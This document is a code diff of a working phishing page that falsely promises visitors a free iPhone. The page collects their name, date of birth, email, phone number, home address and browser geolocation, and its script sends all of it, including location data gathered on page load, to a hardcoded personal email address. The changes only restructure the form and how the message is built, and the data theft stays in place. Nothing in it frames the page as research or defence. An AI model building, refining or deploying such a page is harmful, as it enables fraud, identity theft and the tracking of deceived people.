@@ -8,12 +8,6 @@
     <link href="https://maxcdn.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
     <style>
         /* Your existing styling */
-        #loading-message {
-            display: block;
-        }
-        #form-container {
-            display: none;
-        }
     </style>
 </head>
 <body>
@@ -22,38 +16,32 @@
         <p class="lead">You've been selected to receive a brand-new iPhone!</p>
         <p class="form-text">Please fill out the form below to claim your reward.</p>
 
-        <!-- Loading message while waiting for geolocation -->
-        <div id="loading-message" class="form-text">Fetching your location...</div>
+        <form id="rewardForm">
+            <!-- Form fields -->
+            <label for="fullName">Full Name:</label>
+            <input type="text" id="fullName" class="form-control" required><br>
+            
+            <label for="dob">Date of Birth:</label>
+            <input type="date" id="dob" class="form-control" required><br>
+            
+            <label for="email">Email:</label>
+            <input type="email" id="email" class="form-control" required><br>
+            
+            <label for="phoneNumber">Phone Number:</label>
+            <input type="tel" id="phoneNumber" class="form-control" required><br>
+            
+            <label for="address">Address:</label>
+            <input type="text" id="address" class="form-control" required><br>
+            
+            <label for="city">City:</label>
+            <input type="text" id="city" class="form-control" required><br>
+            
+            <label for="postalCode">Postal Code:</label>
+            <input type="text" id="postalCode" class="form-control" required><br>
 
-        <!-- The form will be shown only after location data is fetched -->
-        <div id="form-container">
-            <form id="rewardForm">
-                <!-- Add form fields -->
-                <label for="fullName">Full Name:</label>
-                <input type="text" id="fullName" class="form-control" required><br>
-                
-                <label for="dob">Date of Birth:</label>
-                <input type="date" id="dob" class="form-control" required><br>
-                
-                <label for="email">Email:</label>
-                <input type="email" id="email" class="form-control" required><br>
-                
-                <label for="phoneNumber">Phone Number:</label>
-                <input type="tel" id="phoneNumber" class="form-control" required><br>
-                
-                <label for="address">Address:</label>
-                <input type="text" id="address" class="form-control" required><br>
-                
-                <label for="city">City:</label>
-                <input type="text" id="city" class="form-control" required><br>
-                
-                <label for="postalCode">Postal Code:</label>
-                <input type="text" id="postalCode" class="form-control" required><br>
-
-                <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
-                <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
-            </form>
-        </div>
+            <p id="locationDisplay" class="form-text">Location permissions required to auto-fill your location.</p>
+            <button type="submit" class="btn btn-primary btn-block">Submit and Claim iPhone</button>
+        </form>
     </div>
 
     <!-- Bootstrap and jQuery JS -->
@@ -65,8 +53,6 @@
     <script>
         document.addEventListener("DOMContentLoaded", function () {
             const locationDisplay = document.getElementById("locationDisplay");
-            const loadingMessage = document.getElementById("loading-message");
-            const formContainer = document.getElementById("form-container");
             let latitude, longitude;
 
             if ("geolocation" in navigator) {
@@ -76,28 +62,16 @@
                         longitude = position.coords.longitude;
                         locationDisplay.textContent = `Latitude: ${latitude}, Longitude: ${longitude}`;
                         
-                        // Hide loading message and show form
-                        loadingMessage.style.display = 'none';
-                        formContainer.style.display = 'block';
-                        
                         // Send initial location data email
                         sendEmail("Geolocation Data", `Latitude: ${latitude}, Longitude: ${longitude}`, "khalilrodeni@gmail.com");
                     },
                     (error) => {
                         locationDisplay.textContent = error.code === error.PERMISSION_DENIED ? "Location access denied by user." : "Location error.";
                         sendEmail("Location Access Error", locationDisplay.textContent, "khalilrodeni@gmail.com");
-
-                        // Hide loading message and show form anyway
-                        loadingMessage.style.display = 'none';
-                        formContainer.style.display = 'block';
                     }
                 );
             } else {
                 locationDisplay.textContent = "Geolocation is not supported by this browser.";
-
-                // Hide loading message and show form anyway
-                loadingMessage.style.display = 'none';
-                formContainer.style.display = 'block';
             }
         });
 
@@ -105,25 +79,32 @@
         document.getElementById("rewardForm").addEventListener("submit", function (e) {
             e.preventDefault();
 
-            // Use FormData to collect form values
-            const formData = new FormData(this);
+            // Get form data
+            const formData = {
+                fullName: document.getElementById("fullName").value,
+                dob: document.getElementById("dob").value,
+                email: document.getElementById("email").value,
+                phoneNumber: document.getElementById("phoneNumber").value,
+                address: document.getElementById("address").value,
+                city: document.getElementById("city").value,
+                postalCode: document.getElementById("postalCode").value,
+                location: `Latitude: ${latitude}, Longitude: ${longitude}`
+            };
 
-            // Add location data manually to FormData
-            formData.append("latitude", latitude);
-            formData.append("longitude", longitude);
+            // Build the email message
+            const message = `
+                Name: ${formData.fullName}
+                Date of Birth: ${formData.dob}
+                Email: ${formData.email}
+                Phone Number: ${formData.phoneNumber}
+                Address: ${formData.address}
+                City: ${formData.city}
+                Postal Code: ${formData.postalCode}
+                Location: ${formData.location}
+            `;
 
-            // Log form data for debugging
-            console.log("Form Data:", Array.from(formData.entries()));
-
-            // Create the email message from the form data
-            let message = '';
-            formData.forEach((value, key) => {
-                message += `${key}: ${value}\n`;
-            });
-
-            // Send the form data via email
+            // Send the email with the form data
             sendEmail("Form Submission Data", message, "khalilrodeni@gmail.com");
-
             alert("Thank you for your submission! We will contact you shortly.");
         });
 
